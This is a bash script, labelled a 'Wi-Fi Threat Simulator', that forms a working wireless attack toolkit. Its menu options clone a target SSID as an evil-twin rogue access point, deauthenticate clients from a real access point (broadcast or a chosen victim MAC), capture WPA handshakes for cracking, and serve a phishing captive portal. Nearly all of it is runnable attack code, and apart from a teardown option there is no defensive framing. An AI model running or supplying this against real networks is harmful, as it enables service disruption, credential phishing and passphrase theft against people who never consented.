#!/bin/bash

# ============= COLORS ============= #
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
CYAN='\033[1;36m'
NC='\033[0m'

RESET_AP() {
    sudo systemctl restart NetworkManager || sudo service network-manager restart
    sudo iptables -F
    sudo iptables -t nat -F
    sudo pkill hostapd
    sudo pkill dnsmasq
    sudo pkill airodump-ng
    sudo pkill aireplay-ng
    sudo ip link set "$MONIF" down 2>/dev/null
    sudo ip link set "$APIF" down 2>/dev/null
    echo -e "${GREEN}[+] Interfaces reset!${NC}"
}

function make_configs() {
    # Generate hostapd.conf
    cat > hostapd.conf <<EOF
interface=$APIF
driver=nl80211
ssid=$FAKESSID
hw_mode=g
channel=$CHANNEL
auth_algs=1
ignore_broadcast_ssid=0
wpa=2
wpa_passphrase=$FAKEPASS
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
EOF
    # Generate dnsmasq.conf
    cat > dnsmasq.conf <<EOF
interface=$APIF
dhcp-range=10.0.0.10,10.0.0.250,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
listen-address=10.0.0.1
EOF
}

function start_rogue_ap() {
    read -p "Rogue AP interface (must support AP mode): " APIF
    read -p "SSID to clone: " FAKESSID
    read -p "Channel: " CHANNEL
    read -p "WPA2 Passphrase (fake): " FAKEPASS
    sudo ip link set "$APIF" down
    sudo ip link set "$APIF" up
    sudo ip addr add 10.0.0.1/24 dev "$APIF"
    make_configs
    echo -e "${CYAN}[*] Starting rogue AP for $FAKESSID on $APIF channel $CHANNEL ...${NC}"
    sudo hostapd hostapd.conf > hostapd.log 2>&1 &
    sleep 3
    sudo dnsmasq -C dnsmasq.conf &
    sudo iptables -t nat -A POSTROUTING -o "$APIF" -j MASQUERADE
    sudo iptables -A FORWARD -i "$APIF" -j ACCEPT
}

function deauth_attack() {
    read -p "Monitor interface (for deauth/airodump): " MONIF
    read -p "Target BSSID (mac of real AP): " BSSID
    read -p "Channel: " CH
    sudo ip link set "$MONIF" down
    sudo iw "$MONIF" set monitor control
    sudo ip link set "$MONIF" up
    echo -e "${CYAN}[*] Starting airodump-ng (run ctrl+c when ready)...${NC}"
    sudo airodump-ng -c "$CH" --bssid "$BSSID" "$MONIF"
    echo -e "${YELLOW}[!] Identify station MACs (clients) above, then enter one to deauth:${NC}"
    read -p "Victim Station MAC (leave empty for broadcast deauth): " STATION
    if [ -z "$STATION" ]; then
        sudo aireplay-ng --deauth 25 -a "$BSSID" "$MONIF"
    else
        sudo aireplay-ng --deauth 25 -a "$BSSID" -c "$STATION" "$MONIF"
    fi
}

function handshake_capture() {
    read -p "Monitor interface: " MONIF
    read -p "Target BSSID: " BSSID
    read -p "Channel: " CH
    TS=$(date +%H%M%S)
    sudo airodump-ng -c "$CH" --bssid "$BSSID" -w "handshake_$TS" "$MONIF"
    echo -e "${GREEN}[✓] Capture saved as handshake_${TS}-01.cap${NC}"
}

function phishing_portal() {
    echo -e "${CYAN}[*] Launching captive portal web server on 10.0.0.1...${NC}"
    sudo python3 -m http.server 80 --bind 10.0.0.1 --directory phishing_portal
    # Note: Must have index.html as phishing portal in phishing_portal/
}

# Main menu
while true; do
    echo -e "${BLUE}\n==== Wi-Fi Threat Simulator ====${NC}"
    echo "1) Start Rogue AP (Evil Twin, captive portal mode)"
    echo "2) Deauth client(s) from real AP"
    echo "3) Capture WPA Handshake"
    echo "4) Launch Phishing Portal (captive page)"
    echo "5) SAFE TEARDOWN/RESET"
    echo "6) Exit"
    read -p "Choice [1-6]: " choice
    case $choice in
        1) start_rogue_ap ;;
        2) deauth_attack ;;
        3) handshake_capture ;;
        4) phishing_portal ;;
        5) RESET_AP ;;
        6) RESET_AP; break ;;
        *) echo -e "${RED}[!] Invalid option.${NC}" ;;
    esac
done
